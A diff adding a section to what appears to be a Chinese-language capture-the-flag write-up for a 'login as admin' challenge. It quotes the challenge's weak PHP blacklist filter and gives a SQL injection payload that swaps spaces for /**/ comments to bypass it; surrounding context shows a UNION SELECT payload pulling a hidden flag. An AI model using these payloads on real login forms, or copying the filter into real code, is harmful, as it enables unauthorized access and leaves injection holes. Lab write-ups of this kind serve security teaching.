@@ -179,3 +179,28 @@ username = \' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#
 password = 1
 ```
 
+
+### 0x09 login as admin 1
+#### https://hackme.inndy.tw/login1/
+這邊會把空白變成空值, 但可以使用 `/**/` 代替空白
+
+再使用 0x07 的 Payload 達成攻擊
+
+``` php
+function safe_filter($str)
+{
+    $strl = strtolower($str);
+    if (strstr($strl, ' ') || strstr($strl, '1=1') || strstr($strl, "''") ||
+        strstr($strl, 'union select') || strstr($strl, 'select ')
+    ) {
+        return '';
+    }
+    return str_replace("'", "\\'", $str);
+}
+```
+
+**Payload:** 
+```
+username = \'/**/||1/**/limit/**/1,1#
+password = 1
+```
